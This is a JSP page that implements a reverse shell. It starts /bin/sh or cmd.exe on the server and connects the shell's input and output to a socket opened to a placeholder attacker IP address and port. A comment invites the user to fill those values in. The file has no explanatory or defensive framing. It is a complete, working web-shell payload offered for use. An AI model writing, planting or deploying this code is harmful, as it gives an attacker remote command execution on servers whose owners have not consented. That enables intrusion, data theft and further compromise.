<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream f3;
    OutputStream kp;

    StreamConnector( InputStream f3, OutputStream kp )
    {
      this.f3 = f3;
      this.kp = kp;
    }

    public void run()
    {
      BufferedReader of  = null;
      BufferedWriter sE_ = null;
      try
      {
        of  = new BufferedReader( new InputStreamReader( this.f3 ) );
        sE_ = new BufferedWriter( new OutputStreamWriter( this.kp ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = of.read( buffer, 0, buffer.length ) ) > 0 )
        {
          sE_.write( buffer, 0, length );
          sE_.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( of != null )
          of.close();
        if( sE_ != null )
          sE_.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}
    
    Socket socket = new Socket( "IP ADDR", PORT );   ##set_it_up_for_yourself
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
